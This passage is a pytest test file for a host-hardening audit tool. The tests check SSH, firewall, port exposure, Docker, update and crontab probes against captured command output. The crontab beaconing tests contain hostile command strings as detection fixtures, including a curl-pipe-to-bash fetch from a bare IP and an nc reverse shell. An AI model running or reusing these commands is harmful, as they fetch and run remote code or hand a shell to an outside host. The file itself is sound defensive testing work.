"""Tests for the live-host audit (`agentsec harden-host`).

Driven entirely by captured command output through the Runner seam — no real host,
no subprocess. The HARDENED_* fixtures are captured from a hardened reference host.
"""
from __future__ import annotations

import json
import shutil
from collections.abc import Callable

import pytest

from agentsec.cli import main
from agentsec.findings import Finding
from agentsec.hostaudit.audit import HostAuditResult, audit_host
from agentsec.hostaudit.probes import (
    Probe,
    RestartStatus,
    is_network_fetch_command,
    parse_apt_check,
    parse_crontab,
    parse_docker_dnat,
    parse_docker_user,
    parse_listeners,
    parse_needrestart_batch,
    parse_sshd_t,
    parse_ufw_status,
)

# ── hardened reference host fixtures ─────────────────────────────────────────────

HARDENED_SSHD = (
    "port 22\n"
    "permitrootlogin prohibit-password\n"
    "pubkeyauthentication yes\n"
    "passwordauthentication yes\n"
    "allowusers deploy@203.0.113.4\n"
    "x11forwarding no\n"
)
# Both directions denied by default: a genuinely hardened host also denies egress
# by default (the JadePuffer defense — see the egress tests below for the
# allow-outgoing case, which is the common fresh-install default this probe flags).
HARDENED_UFW = (
    "Status: active\n"
    "Logging: on (low)\n"
    "Default: deny (incoming), deny (outgoing), deny (routed)\n"
    "New profiles: skip\n"
)
HARDENED_SS = (
    "LISTEN 0      4096       127.0.0.1:33591      0.0.0.0:*\n"
    "LISTEN 0      4096       127.0.0.54:53        0.0.0.0:*\n"
    "LISTEN 0      128        0.0.0.0:22           0.0.0.0:*\n"
    "LISTEN 0      128        [::]:22              [::]:*\n"
    "LISTEN 0      4096       127.0.0.53%lo:53     0.0.0.0:*\n"
)
# Docker present but no datastore published off-loopback (a clean host).
HARDENED_DOCKER_NAT = (
    "Chain DOCKER (1 references)\n"
    "target     prot opt source               destination\n"
    "RETURN     all  --  0.0.0.0/0            0.0.0.0/0\n"
)
HARDENED_DOCKER_USER = (
    "Chain DOCKER-USER (1 references)\n"
    "target     prot opt source               destination\n"
    "RETURN     all  --  0.0.0.0/0            0.0.0.0/0\n"
)


def _runner(responses: dict[str, tuple[int, str] | None]) -> Callable[[list[str]], tuple[int, str] | None]:
    def run(argv: list[str]) -> tuple[int, str] | None:
        return responses.get(" ".join(argv))
    return run


@pytest.fixture(autouse=True)
def _needrestart_not_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
    # `probe_restart_required` asks `shutil.which("needrestart")` to tell "not installed" from
    # "installed but the run came back None". Without this, every `"needrestart -b": None` test
    # takes a different branch on a host that has needrestart. Only that one name is faked;
    # a test that needs it present overrides this with its own `monkeypatch.setattr`.
    real_which = shutil.which
    monkeypatch.setattr(
        "agentsec.hostaudit.probes.shutil.which",
        lambda name, *a, **kw: None if name == "needrestart" else real_which(name, *a, **kw),
    )


def _hardened_runner(
    **overrides: tuple[int, str] | None,
) -> Callable[[list[str]], tuple[int, str] | None]:
    base: dict[str, tuple[int, str] | None] = {
        "sshd -T": (0, HARDENED_SSHD),
        "ufw status verbose": (0, HARDENED_UFW),
        "systemctl is-active fail2ban": (0, "active\n"),
        "systemctl is-enabled unattended-upgrades": (0, "enabled\n"),
        "ss -tlnH": (0, HARDENED_SS),
        "iptables -t nat -L DOCKER -n": (0, HARDENED_DOCKER_NAT),
        "iptables -L DOCKER-USER -n": (0, HARDENED_DOCKER_USER),
        "crontab -l": (1, "no crontab for deploy\n"),
        "/usr/lib/update-notifier/apt-check": (0, "0;0\n"),
        "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 1\n"),
    }
    base.update(overrides)
    return _runner(base)


# ── pure parsers ────────────────────────────────────────────────────────────────

def test_parse_sshd_t() -> None:
    cfg = parse_sshd_t(HARDENED_SSHD)
    assert cfg["passwordauthentication"] == "yes"
    assert cfg["permitrootlogin"] == "prohibit-password"
    assert cfg["pubkeyauthentication"] == "yes"
    assert cfg["x11forwarding"] == "no"


def test_parse_ufw_active_deny() -> None:
    u = parse_ufw_status(HARDENED_UFW)
    assert u.active is True
    assert u.default_deny_incoming is True
    assert u.default_deny_outgoing is True


def test_parse_ufw_inactive() -> None:
    u = parse_ufw_status("Status: inactive\n")
    assert u.active is False


def test_parse_listeners_loopback_and_all() -> None:
    ls = {(x.address, x.port): x for x in parse_listeners(HARDENED_SS)}
    assert ls[("0.0.0.0", 22)].is_all_interfaces is True
    assert ls[("127.0.0.1", 33591)].is_loopback is True
    assert ls[("127.0.0.53", 53)].is_loopback is True   # %lo zone stripped
    assert ls[("::", 22)].is_all_interfaces is True       # brackets stripped


# ── audit_host: a hardened host = exactly the intentional password-auth finding ──

def test_audit_host_hardened_only_password_auth() -> None:
    res = audit_host(_hardened_runner())
    rules = sorted(f.rule for f in res.findings)
    assert rules == ["harden-host/ssh-password-auth"]
    f = res.findings[0]
    assert f.severity == "medium"
    assert f.check_id == "harden-host"
    assert all(p.ok for p in res.probes)   # everything was readable


# ── audit_host: a deliberately weak host fires the full set ──────────────────────

def test_audit_host_weak_host_fires_all() -> None:
    res = audit_host(_hardened_runner(
        **{
            "sshd -T": (0, "permitrootlogin yes\npasswordauthentication yes\npubkeyauthentication no\n"),
            "ufw status verbose": (0, "Status: inactive\n"),
            "systemctl is-active fail2ban": (0, "inactive\n"),
            "systemctl is-enabled unattended-upgrades": (0, "disabled\n"),
            "ss -tlnH": (0, "LISTEN 0 128 0.0.0.0:5432 0.0.0.0:*\nLISTEN 0 128 127.0.0.1:6379 0.0.0.0:*\n"),
            "/usr/lib/update-notifier/apt-check": (0, "12;3\n"),
            "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 3\nNEEDRESTART-SVC: ssh.service\n"),
        }
    ))
    rules = {f.rule for f in res.findings}
    assert rules == {
        "harden-host/ssh-root-login",
        "harden-host/ssh-password-auth",
        "harden-host/ssh-pubkey-disabled",
        "harden-host/ssh-no-allowlist",
        "harden-host/firewall-inactive",
        "harden-host/fail2ban-inactive",
        "harden-host/auto-updates-disabled",
        "harden-host/datastore-port-exposed",
        "harden-host/security-updates-pending",
        "harden-host/restart-owed",
    }
    # the Redis listener on loopback must NOT fire (FP-bait)
    exposed = [f for f in res.findings if f.rule == "harden-host/datastore-port-exposed"]
    assert len(exposed) == 1 and "PostgreSQL" in exposed[0].title


def test_audit_host_ssh_no_allowlist_toggles() -> None:
    """The live ssh-no-allowlist finding fires with no AllowUsers/AllowGroups, silent with one."""
    open_ = audit_host(_hardened_runner(
        **{"sshd -T": (0, "passwordauthentication no\npubkeyauthentication yes\n")}))
    assert "harden-host/ssh-no-allowlist" in {f.rule for f in open_.findings}
    scoped = audit_host(_hardened_runner(
        **{"sshd -T": (0, "pubkeyauthentication yes\nallowgroups ssh-users\n")}))
    assert "harden-host/ssh-no-allowlist" not in {f.rule for f in scoped.findings}


# ── never-raise: nothing readable -> no findings, all probes disclosed as not-ok ──

def test_audit_host_no_tools_degrades_gracefully() -> None:
    res = audit_host(_runner({}))   # every command returns None
    assert res.findings == []
    assert all(not p.ok and p.reason for p in res.probes)
    assert {p.name for p in res.probes} == {
        "ssh", "ufw", "crontab", "fail2ban", "auto-updates", "security-updates", "restart-required",
        "listeners", "docker-dnat", "docker-user",
    }


# ── egress (default-outgoing) policy (JadePuffer defense, B5) ────────────────────

def test_parse_ufw_outgoing_policy() -> None:
    allow_out = parse_ufw_status(
        "Status: active\nDefault: deny (incoming), allow (outgoing), deny (routed)\n"
    )
    assert allow_out.default_deny_incoming is True   # incoming parsing is unaffected
    assert allow_out.default_deny_outgoing is False
    deny_out = parse_ufw_status(HARDENED_UFW)
    assert deny_out.default_deny_outgoing is True


def test_parse_ufw_missing_parens_marker_is_inconclusive_not_false_deny() -> None:
    # Review L3: real `ufw` always emits the parenthesized "(incoming)"/"(outgoing)" markers, but
    # a malformed/future-format line without them must not be substring-searched as a whole —
    # "deny incoming, allow outgoing" (no parens) previously matched "deny" against the OUTGOING
    # policy too (via the leading "deny incoming" text), inferring default_deny_outgoing=True when
    # the real outgoing policy is "allow". That's the false-clean direction: it would silently
    # suppress firewall-default-allow-outgoing on a host that's actually open by default.
    u = parse_ufw_status("Status: active\nDefault: deny incoming, allow outgoing\n")
    assert u.default_deny_outgoing is False  # inconclusive -> safe default, not a false True
    assert u.default_deny_incoming is False


def test_audit_host_egress_allow_by_default_fires() -> None:
    # planted violation: the common fresh-install default (deny incoming, allow outgoing).
    res = audit_host(_hardened_runner(**{
        "ufw status verbose": (0, "Status: active\nDefault: deny (incoming), allow (outgoing), deny (routed)\n"),
    }))
    rules = {f.rule for f in res.findings}
    assert "harden-host/firewall-default-allow-outgoing" in rules
    f = next(f for f in res.findings if f.rule == "harden-host/firewall-default-allow-outgoing")
    assert f.severity == "medium"
    # the incoming finding must NOT also fire -- only the outgoing policy is weak here.
    assert "harden-host/firewall-default-allow-incoming" not in rules


def test_audit_host_egress_deny_by_default_silent() -> None:
    # FP-bait: a host that denies both directions by default -> no egress finding.
    res = audit_host(_hardened_runner())   # HARDENED_UFW denies incoming AND outgoing
    assert not any(f.rule == "harden-host/firewall-default-allow-outgoing" for f in res.findings)


def test_audit_host_egress_and_ingress_allow_both_fire() -> None:
    # both defaults weak -> both findings present (independent checks, not early-return).
    res = audit_host(_hardened_runner(**{
        "ufw status verbose": (0, "Status: active\nDefault: allow (incoming), allow (outgoing), deny (routed)\n"),
    }))
    rules = {f.rule for f in res.findings}
    assert "harden-host/firewall-default-allow-incoming" in rules
    assert "harden-host/firewall-default-allow-outgoing" in rules


def test_audit_host_ufw_needs_root_disclosed() -> None:
    # ufw present but output unreadable without root -> probe not ok, no false "inactive" finding.
    res = audit_host(_hardened_runner(**{"ufw status verbose": (0, "ERROR: You need to be root\n")}))
    ufw = next(p for p in res.probes if p.name == "ufw")
    assert not ufw.ok
    assert not any("firewall" in f.rule for f in res.findings)


# ── auto-updates: not-installed must not read as "installed but not enabled" (review #251) ──

def test_audit_host_auto_updates_not_installed_no_false_installed_claim() -> None:
    # `systemctl is-enabled <missing unit>` prints "not-found" (rc 4), never empty. The finding
    # still fires (an unpatched host IS the case worth flagging), but must NOT claim the unit is
    # "installed but not enabled".
    res = audit_host(_hardened_runner(**{"systemctl is-enabled unattended-upgrades": (4, "not-found\n")}))
    f = next(f for f in res.findings if f.rule == "harden-host/auto-updates-disabled")
    assert "installed but not enabled" not in f.message


# ── security updates applied + restart owed (Dean's redesign review) ─────────────

def test_parse_apt_check() -> None:
    p = parse_apt_check("12;3\n")
    assert p is not None and p.total == 12 and p.security == 3
    clean = parse_apt_check("0;0\n")
    assert clean is not None and clean.security == 0


def test_parse_apt_check_unparseable_is_none_not_false_clean() -> None:
    # a human-readable or otherwise unexpected line must not be silently read as "0 pending".
    assert parse_apt_check("3 packages can be updated.\n2 updates are security updates.\n") is None
    assert parse_apt_check("") is None
    for garbled in ("abc;1\n", ";\n", "1;\n", ";1\n", "-1;0\n", "1;2;3\n"):
        assert parse_apt_check(garbled) is None, garbled


def test_parse_apt_check_reads_the_last_line_past_stderr_noise() -> None:
    # apt-check writes its `<total>;<security>` answer to STDERR, and `real_runner` returns
    # stdout + stderr, so a warning printed ahead of it must not hide the answer (review M2).
    p = parse_apt_check("W: some apt warning on stdout\nE: Could not open lock file\n7;2\n")
    assert p is not None and p.total == 7 and p.security == 2


def test_audit_host_security_updates_pending_fires() -> None:
    res = audit_host(_hardened_runner(**{"/usr/lib/update-notifier/apt-check": (0, "12;3\n")}))
    f = next(f for f in res.findings if f.rule == "harden-host/security-updates-pending")
    assert f.severity == "high" and "3 pending security update" in f.message


def test_audit_host_security_updates_clean_silent() -> None:
    # FP-bait: zero pending security updates (even with other, non-security updates pending).
    res = audit_host(_hardened_runner(**{"/usr/lib/update-notifier/apt-check": (0, "9;0\n")}))
    assert not any(f.rule == "harden-host/security-updates-pending" for f in res.findings)


def test_audit_host_apt_check_not_installed_disclosed() -> None:
    res = audit_host(_hardened_runner(**{"/usr/lib/update-notifier/apt-check": None}))
    p = next(p for p in res.probes if p.name == "security-updates")
    assert not p.ok and p.reason
    assert not any(f.rule == "harden-host/security-updates-pending" for f in res.findings)


def test_parse_needrestart_batch() -> None:
    r = parse_needrestart_batch(
        "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 3\nNEEDRESTART-SVC: ssh.service\n"
        "NEEDRESTART-SVC: cron.service\n"
    )
    assert r.kernel_restart_needed is True
    assert r.services_needing_restart == ("ssh.service", "cron.service")
    current = parse_needrestart_batch("NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 1\n")
    assert current.kernel_restart_needed is False
    assert current.services_needing_restart == ()


def test_parse_needrestart_batch_missing_ksta_flags_not_suppresses() -> None:
    # same "uncertain reads as flag it" direction as the ufw markers-missing case above: an
    # absent/unrecognized KSTA line must not be silently read as "confirmed current".
    r = parse_needrestart_batch("NEEDRESTART-VER: 3.6\n")
    assert r.kernel_restart_needed is True


def test_parse_needrestart_batch_ksta_0_is_unknown_not_confirmed_pending() -> None:
    # KSTA 0 ("unknown", seen on containers/WSL/some cloud kernels) still flags (the safe
    # direction, M1) but must be distinguishable from a positively-observed pending update.
    r = parse_needrestart_batch("NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 0\n")
    assert r.kernel_restart_needed is True
    assert r.kernel_state_unknown is True


def test_parse_needrestart_batch_ksta_2_is_confirmed_pending() -> None:
    # KSTA 2/3 are needrestart's own confirmed "kernel update pending" codes -- NOT unknown.
    r = parse_needrestart_batch("NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 2\n")
    assert r.kernel_restart_needed is True
    assert r.kernel_state_unknown is False


def test_audit_host_restart_owed_kernel_unknown_state_wording() -> None:
    # M1: KSTA 0 must not be worded as a confirmed kernel update -- the real state is unknown.
    res = audit_host(_hardened_runner(**{
        "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 0\n"),
    }))
    f = next(f for f in res.findings if f.rule == "harden-host/restart-owed")
    assert "kernel update is installed" not in f.message
    assert "could not be confirmed" in f.message


def test_audit_host_restart_owed_kernel_confirmed_pending_wording() -> None:
    # The stronger "a kernel update is installed" wording is reserved for KSTA 2/3.
    res = audit_host(_hardened_runner(**{
        "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 2\n"),
    }))
    f = next(f for f in res.findings if f.rule == "harden-host/restart-owed")
    assert "kernel update is installed" in f.message


def test_audit_host_restart_owed_fires_on_service() -> None:
    res = audit_host(_hardened_runner(**{
        "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 1\nNEEDRESTART-SVC: php-fpm.service\n"),
    }))
    f = next(f for f in res.findings if f.rule == "harden-host/restart-owed")
    assert f.severity == "medium" and "php-fpm.service" in f.message


def test_audit_host_restart_owed_fires_on_kernel() -> None:
    res = audit_host(_hardened_runner(**{
        "needrestart -b": (0, "NEEDRESTART-VER: 3.6\nNEEDRESTART-KSTA: 3\n"),
    }))
    assert any(f.rule == "harden-host/restart-owed" for f in res.findings)


def test_audit_host_restart_owed_clean_silent() -> None:
    # FP-bait: current kernel, no services flagged -> stays silent.
    res = audit_host(_hardened_runner())
    assert not any(f.rule == "harden-host/restart-owed" for f in res.findings)


def test_audit_host_restart_owed_falls_back_to_reboot_required_file() -> None:
    # `needrestart` not installed -> falls back to the reboot-required marker file alone,
    # with no per-service claim (the thing the file-only mode genuinely cannot answer).
    res = audit_host(_hardened_runner(**{
        "needrestart -b": None,
        "ls /var/run/reboot-required": (0, ""),
    }))
    f = next(f for f in res.findings if f.rule == "harden-host/restart-owed")
    assert "kernel update is installed" in f.message
    rr = next(p for p in res.probes if p.name == "restart-required")
    assert rr.ok and isinstance(rr.data, RestartStatus) and rr.data.services_needing_restart == ()


def test_audit_host_restart_needrestart_genuinely_absent_is_a_plain_fallback() -> None:
    # The mirror of the two disclosure tests below (round-2 M-new-1): when needrestart is simply
    # not installed (the autouse fixture keeps it off PATH), the marker-file fallback is the
    # normal, expected mode, so it must NOT carry a degraded-run reason.
    res = audit_host(_hardened_runner(**{
        "needrestart -b": None,
        "ls /var/run/reboot-required": (1, ""),
    }))
    rr = next(p for p in res.probes if p.name == "restart-required")
    assert rr.ok and rr.reason == ""
    assert isinstance(rr.data, RestartStatus) and rr.data.kernel_restart_needed is False


def test_audit_host_restart_needrestart_unusable_and_ls_missing_names_the_real_cause(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # needrestart IS installed but its run came back None, and `ls` is missing too: the probe is
    # disclosed as not-ok, and the reason must not claim needrestart is "not installed".
    monkeypatch.setattr(
        "agentsec.hostaudit.probes.shutil.which",
        lambda name, *a, **kw: "/usr/sbin/needrestart" if name == "needrestart" else None,
    )
    res = audit_host(_hardened_runner(**{"needrestart -b": None, "ls /var/run/reboot-required": None}))
    rr = next(p for p in res.probes if p.name == "restart-required")
    assert not rr.ok
    assert "not installed" not in rr.reason and "did not complete" in rr.reason


def test_audit_host_restart_owed_needrestart_timeout_disclosed(monkeypatch: pytest.MonkeyPatch) -> None:
    # H1: `needrestart -b` present but the runner timed out (-> None, same as `real_runner` on a
    # timeout/subprocess error) must NOT read identically to "genuinely not installed" -- the probe
    # still degrades to the kernel-only marker, but discloses the gap via a visible reason, not a
    # bare clean pass.
    monkeypatch.setattr(
        "agentsec.hostaudit.probes.shutil.which",
        lambda name: "/usr/sbin/needrestart" if name == "needrestart" else None,
    )
    res = audit_host(_hardened_runner(**{
        "needrestart -b": None,
        "ls /var/run/reboot-required": (0, ""),
    }))
    rr = next(p for p in res.probes if p.name == "restart-required")
    assert rr.ok and isinstance(rr.data, RestartStatus)
    assert rr.reason  # disclosed, not a silent clean pass
    assert "needrestart" in rr.reason.lower()


def test_audit_host_restart_owed_needrestart_garbage_output_disclosed() -> None:
    # H1: `needrestart -b` present and ran (rc 0, non-empty output) but the output is
    # unrecognizable (no NEEDRESTART-VER marker) -- same disclosure requirement as the timeout case.
    res = audit_host(_hardened_runner(**{
        "needrestart -b": (0, "some unexpected / garbled output\n"),
        "ls /var/run/reboot-required": (0, ""),
    }))
    rr = next(p for p in res.probes if p.name == "restart-required")
    assert rr.ok and isinstance(rr.data, RestartStatus)
    assert rr.reason  # disclosed, not a silent clean pass
    assert "unrecognized" in rr.reason.lower()


def test_audit_host_restart_owed_file_absent_silent() -> None:
    res = audit_host(_hardened_runner(**{
        "needrestart -b": None,
        "ls /var/run/reboot-required": (1, "ls: cannot access '/var/run/reboot-required': No such file or directory\n"),
    }))
    assert not any(f.rule == "harden-host/restart-owed" for f in res.findings)


def test_audit_host_restart_owed_neither_tool_disclosed() -> None:
    res = audit_host(_hardened_runner(**{"needrestart -b": None, "ls /var/run/reboot-required": None}))
    p = next(p for p in res.probes if p.name == "restart-required")
    assert not p.ok and p.reason
    assert not any(f.rule == "harden-host/restart-owed" for f in res.findings)


# ── CLI boundary: cmd_harden_host exit codes / format / sudo-hint gating (review #251) ──

def _fake_host_result(*, high: bool = True, skip_reason: str | None = None) -> HostAuditResult:
    findings = []
    if high:
        findings.append(Finding(
            check_id="harden-host", rule="harden-host/ssh-root-login", severity="high",
            title="Root login enabled (live)", location="host:ssh", message="…",
        ))
    probes = [Probe("ssh", ok=True)]
    if skip_reason is not None:
        probes.append(Probe("ufw", ok=False, reason=skip_reason))
    return HostAuditResult(findings=findings, probes=probes)


def test_harden_host_cli_fail_on_exit_code(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("agentsec.hostaudit.audit_host", lambda: _fake_host_result(high=True))
    assert main(["harden-host", "--fail-on", "high"]) == 1
    assert main(["harden-host", "--fail-on", "high", "--no-fail"]) == 0
    monkeypatch.setattr("agentsec.hostaudit.audit_host", lambda: _fake_host_result(high=False))
    assert main(["harden-host", "--fail-on", "high"]) == 0


def test_harden_host_cli_sarif_is_valid_json(monkeypatch: pytest.MonkeyPatch,
                                             capsys: pytest.CaptureFixture[str]) -> None:
    monkeypatch.setattr("agentsec.hostaudit.audit_host", lambda: _fake_host_result(high=True))
    main(["harden-host", "--format", "sarif"])
    json.loads(capsys.readouterr().out)  # sarif to stdout must be parseable (no meta lines mixed in)


def test_harden_host_cli_shows_reason_on_degraded_ok_probe(monkeypatch: pytest.MonkeyPatch,
                                                           capsys: pytest.CaptureFixture[str]) -> None:
    # H1 render check: a probe can be `ok=True` and still carry a `reason` (the restart-required
    # kernel-only degrade). That reason must reach the report's "Probed:" line, not just a `not ok`
    # skip line, or the disclosure never surfaces to a reader.
    degraded = HostAuditResult(findings=[], probes=[
        Probe("ssh", ok=True),
        Probe("restart-required", ok=True, reason="needrestart present but unusable"),
    ])
    monkeypatch.setattr("agentsec.hostaudit.audit_host", lambda: degraded)
    main(["harden-host"])
    out = capsys.readouterr().out
    assert "restart-required (needrestart present but unusable)" in out


def test_harden_host_cli_sudo_hint_only_on_root_skip(monkeypatch: pytest.MonkeyPatch,
                                                     capsys: pytest.CaptureFixture[str]) -> None:
    # a "not installed" skip must NOT suggest sudo (sudo can't conjure a missing binary)...
    monkeypatch.setattr("agentsec.hostaudit.audit_host",
                        lambda: _fake_host_result(high=False, skip_reason="`ufw` not installed"))
    main(["harden-host"])
    assert "Run with sudo" not in capsys.readouterr().out
    # ...but a "needs root" skip should.
    monkeypatch.setattr("agentsec.hostaudit.audit_host",
                        lambda: _fake_host_result(high=False, skip_reason="`ufw status` unreadable (needs root)"))
    main(["harden-host"])
    assert "Run with sudo" in capsys.readouterr().out


# ── Docker DNAT / DOCKER-USER probes (#357) ──────────────────────────────────────

_DNAT_MONGO = (
    "Chain DOCKER (2 references)\n"
    "target     prot opt source               destination\n"
    "RETURN     all  --  0.0.0.0/0            0.0.0.0/0\n"
    "DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:27017 to:172.18.0.2:27017\n"
)
_DNAT_LOOPBACK = (
    "Chain DOCKER (2 references)\n"
    "DNAT       tcp  --  0.0.0.0/0            127.0.0.1            tcp dpt:5432 to:172.18.0.3:5432\n"
)
_DNAT_WEB = (
    "Chain DOCKER (1 references)\n"
    "DNAT       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:8080 to:172.18.0.4:80\n"
)
_DU_DROP = (
    "Chain DOCKER-USER (1 references)\n"
    "DROP       all  --  !eth0                0.0.0.0/0\n"
    "RETURN     all  --  0.0.0.0/0            0.0.0.0/0\n"
)
_SS_MONGO = HARDENED_SS + "LISTEN 0      128        0.0.0.0:27017        0.0.0.0:*\n"


def test_parse_docker_dnat() -> None:
    rules = parse_docker_dnat(_DNAT_MONGO)
    assert len(rules) == 1
    assert rules[0].port == 27017 and rules[0].dest == "0.0.0.0"
    assert rules[0].is_public is True and rules[0].datastore == "MongoDB"
    # loopback destination is not public
    loop = parse_docker_dnat(_DNAT_LOOPBACK)[0]
    assert loop.is_public is False
    # a non-datastore port is parsed but classifies as None
    web = parse_docker_dnat(_DNAT_WEB)[0]
    assert web.port == 8080 and web.datastore is None


def test_parse_docker_user() -> None:
    assert parse_docker_user(HARDENED_DOCKER_USER) is False   # only RETURN
    assert parse_docker_user(_DU_DROP) is True                # a DROP rule present


def _docker_runner(**overrides: tuple[int, str] | None) -> Callable[[list[str]], tuple[int, str] | None]:
    return _hardened_runner(**overrides)


def test_dnat_datastore_exposed_fires_when_ss_misses_it() -> None:
    # proxy-off: mongo has a public DNAT rule but no ss listener -> the gap this probe closes.
    res = audit_host(_docker_runner(**{"iptables -t nat -L DOCKER -n": (0, _DNAT_MONGO)}))
    rules = {f.rule for f in res.findings}
    assert "harden-host/docker-dnat-datastore-exposed" in rules
    f = next(f for f in res.findings if f.rule == "harden-host/docker-dnat-datastore-exposed")
    assert f.severity == "high" and "MongoDB" in f.title


def test_dnat_deduped_when_listener_already_flagged() -> None:
    # proxy-on: mongo is visible to BOTH ss and DNAT -> only the listener finding, no DNAT double.
    res = audit_host(_docker_runner(**{
        "ss -tlnH": (0, _SS_MONGO),
        "iptables -t nat -L DOCKER -n": (0, _DNAT_MONGO),
    }))
    assert not any(f.rule == "harden-host/docker-dnat-datastore-exposed" for f in res.findings)
    assert any(f.rule == "harden-host/datastore-port-exposed" for f in res.findings)


def test_dnat_loopback_and_web_silent() -> None:
    assert not any(
        "docker-dnat" in f.rule
        for f in audit_host(_docker_runner(**{"iptables -t nat -L DOCKER -n": (0, _DNAT_LOOPBACK)})).findings
    )
    assert not any(
        "docker-dnat" in f.rule
        for f in audit_host(_docker_runner(**{"iptables -t nat -L DOCKER -n": (0, _DNAT_WEB)})).findings
    )


def test_docker_user_no_filter_fires_only_with_exposed_dnat() -> None:
    # exposed DNAT + empty DOCKER-USER -> the low mitigation finding fires.
    res = audit_host(_docker_runner(**{"iptables -t nat -L DOCKER -n": (0, _DNAT_MONGO)}))
    assert any(f.rule == "harden-host/docker-user-no-filter" and f.severity == "low" for f in res.findings)
    # exposed DNAT but DOCKER-USER has a DROP -> no mitigation finding.
    res2 = audit_host(_docker_runner(**{
        "iptables -t nat -L DOCKER -n": (0, _DNAT_MONGO),
        "iptables -L DOCKER-USER -n": (0, _DU_DROP),
    }))
    assert not any(f.rule == "harden-host/docker-user-no-filter" for f in res2.findings)
    # no exposed DNAT (clean host) -> no mitigation finding even with an empty DOCKER-USER.
    res3 = audit_host(_docker_runner())
    assert not any(f.rule == "harden-host/docker-user-no-filter" for f in res3.findings)


def test_docker_dnat_needs_root_disclosed() -> None:
    # iptables present but the DOCKER nat chain isn't readable without root -> probe not ok,
    # no finding (a probe that can't read must never read as a pass) (#363 review).
    res = audit_host(_hardened_runner(
        **{"iptables -t nat -L DOCKER -n": (4, "iptables v1.8.7 (nf_tables): Permission denied (you must be root)\n")}
    ))
    p = next(p for p in res.probes if p.name == "docker-dnat")
    assert not p.ok and p.reason
    assert not any("docker-dnat" in f.rule for f in res.findings)


def test_docker_user_needs_root_disclosed() -> None:
    res = audit_host(_hardened_runner(
        **{"iptables -L DOCKER-USER -n": (4, "iptables v1.8.7 (nf_tables): Permission denied (you must be root)\n")}
    ))
    p = next(p for p in res.probes if p.name == "docker-user")
    assert not p.ok and p.reason


def test_docker_dnat_rejects_wrong_chain_output() -> None:
    # Defensive (#363 review): DOCKER-USER output contains the substring "Chain DOCKER" but is NOT
    # the DOCKER nat chain — it must be rejected, not parsed for DNAT rules.
    res = audit_host(_hardened_runner(
        **{"iptables -t nat -L DOCKER -n": (0, "Chain DOCKER-USER (1 references)\nRETURN all -- 0.0.0.0/0 0.0.0.0/0\n")}
    ))
    p = next(p for p in res.probes if p.name == "docker-dnat")
    assert not p.ok


# ── crontab beaconing probe (JadePuffer persistence, B5) ─────────────────────────

def test_parse_crontab_basic_and_macros() -> None:
    text = (
        "PATH=/usr/bin:/bin\n"
        "MAILTO=\n"
        "# a comment line\n"
        "\n"
        "*/30 * * * * curl -s http://45.131.66.106/beacon.sh | bash\n"
        "@daily curl -s https://example.com/report -o /tmp/report\n"
        "@reboot /usr/local/bin/start-agent.sh\n"
    )
    entries = parse_crontab(text)
    by_schedule = {e.schedule: e for e in entries}
    assert len(entries) == 3   # PATH/MAILTO/comment/blank lines are not entries
    assert by_schedule["*/30 * * * *"].interval_minutes == 30
    assert by_schedule["@daily"].interval_minutes == 1440
    assert by_schedule["@reboot"].interval_minutes is None


def test_parse_crontab_unusual_whitespace_and_inline_comment() -> None:
    # adversarial (#3): tabs, doubled spaces, and a trailing inline comment on the command.
    text = "*/30\t*\t*   *\t*\tcurl  -s   http://45.131.66.106/x.sh   # \"daily\" check (it isn't)\n"
    entries = parse_crontab(text)
    assert len(entries) == 1
    assert entries[0].interval_minutes == 30
    assert "45.131.66.106" in entries[0].command


def test_parse_crontab_comma_list_and_star_minute() -> None:
    entries = parse_crontab(
        "0,30 * * * * curl -s http://45.131.66.106/x.sh\n"
        "* * * * * curl -s http://45.131.66.106/y.sh\n"
        "0 9 * * * curl -s http://45.131.66.106/z.sh\n"   # fixed daily hour -> not "frequent"
    )
    by_command_suffix = {e.command[-4:]: e for e in entries}
    assert by_command_suffix["x.sh"].interval_minutes == 30
    assert by_command_suffix["y.sh"].interval_minutes == 1
    assert by_command_suffix["z.sh"].interval_minutes is None


def test_is_network_fetch_command_signal_vs_fp_bait() -> None:
    # signal: curl/wget/nc-family to a non-loopback target, or a bare non-loopback IP literal.
    assert is_network_fetch_command("curl -s http://45.131.66.106/x.sh | bash") is True
    assert is_network_fetch_command("nc 45.131.66.106 4444 -e /bin/sh") is True
    assert is_network_fetch_command("wget -qO- https://pypi.org/simple/") is True  # no domain allowlist
    # adversarial (#3): FP-bait, a fetch whose only target is loopback is exempted.
    assert is_network_fetch_command("curl -s http://localhost:8080/healthz") is False
    assert is_network_fetch_command("curl -s http://127.0.0.1:9000/ping") is False
    # FP-bait: no fetch-shaped command and no bare IP anywhere.
    assert is_network_fetch_command("/usr/local/bin/backup.sh --rotate") is False
    assert is_network_fetch_command("find /tmp -mtime +7 -delete") is False


def test_audit_host_crontab_beacon_fires() -> None:
    # planted violation: JadePuffer's exact shape (30-min curl-pipe-to-bash from a bare IP).
    res = audit_host(_hardened_runner(
        **{"crontab -l": (0, "*/30 * * * * curl -s http://45.131.66.106/beacon.sh | bash\n")}
    ))
    rules = {f.rule for f in res.findings}
    assert "harden-host/crontab-beaconing-entry" in rules
    f = next(f for f in res.findings if f.rule == "harden-host/crontab-beaconing-entry")
    assert f.severity == "high"
    assert "45.131.66.106" in f.message


def test_audit_host_crontab_frequent_benign_silent() -> None:
    # FP-bait: frequent, but no network-fetch-shaped command -> stays silent
    # (not "any short-interval cron job fires").
    res = audit_host(_hardened_runner(
        **{"crontab -l": (0, "*/5 * * * * /usr/local/bin/rotate-logs.sh\n")}
    ))
    assert not any(f.rule == "harden-host/crontab-beaconing-entry" for f in res.findings)


def test_audit_host_crontab_rare_fetch_silent() -> None:
